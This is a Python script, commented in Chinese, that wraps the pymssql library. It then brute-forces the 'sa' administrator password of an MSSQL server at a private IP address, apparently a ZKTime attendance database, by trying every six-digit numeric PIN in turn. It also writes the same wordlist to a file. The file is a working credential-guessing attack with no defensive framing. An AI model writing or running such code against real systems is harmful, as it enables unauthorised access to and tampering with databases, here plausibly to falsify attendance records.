import pymssql
import os


# 上班考勤打卡
class MSSQL:
    """
    对pymssql的简单封装

    """

    def __init__(self, host, user, pwd, db):
        self.host = host
        self.user = user
        self.pwd = pwd
        self.db = db

    def __GetConnect(self):
        """
        得到连接信息
        返回: conn.cursor()
        """
        if not self.db:
            raise (NameError, "没有设置数据库信息")
        self.conn = pymssql.connect(host=self.host, user=self.user, password=self.pwd, database=self.db, charset="utf8")
        cur = self.conn.cursor()
        if not cur:
            raise (NameError, "连接数据库失败")
        else:
            return cur

    def ExecQuery(self, sql):
        """
        执行查询语句
        返回的是一个包含tuple的list，list的元素是记录行，tuple的元素是每行记录的字段

        调用示例：
                ms = MSSQL(host="localhost",user="sa",pwd="123456",db="PythonWeiboStatistics")
                resList = ms.ExecQuery("SELECT id,NickName FROM WeiBoUser")
                for (id,NickName) in resList:
                    print str(id),NickName
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        resList = cur.fetchall()

        # 查询完毕后必须关闭连接
        self.conn.close()
        return resList

    def ExecNonQuery(self, sql):
        """
        执行非查询语句

        调用示例：
            cur = self.__GetConnect()
            cur.execute(sql)
            self.conn.commit()
            self.conn.close()
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        self.conn.commit()
        self.conn.close()


def pd():
    pds = []
    rg = range(0, 10)
    for first in rg:
        for second in rg:
            for three in rg:
                for four in rg:
                    for five in rg:
                        for six in rg:
                            num = "%s%s%s%s%s%s" % (first, second, three, four, five, six)
                            pds.append(num)

    file_object = open('f:/pwdNum6.txt', 'w')
    file_object.writelines(['%s%s' % (x, os.linesep) for x in pds])
    file_object.close()


def main():
    # 生成密码列表
    password = []
    rg = range(0, 10)
    for p1 in rg:
        for p2 in rg:
            for p3 in rg:
                for p4 in rg:
                    for p5 in rg:
                        for p6 in rg:
                            num = "%s%s%s%s%s%s" % (p1, p2, p3, p4, p5, p6)
                            password.append(num)
    for i in range(len(password)):
        strpd = str(password[i])
        try:
            ms = MSSQL(host="192.168.2.228", user="sa", pwd=strpd, db="zktime8")
            query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
            print('Success!', password, ';', query)
            input()
        except Exception as e:
            # print(Exception, ":", e, password)
            print(password)


if __name__ == '__main__':
    main()
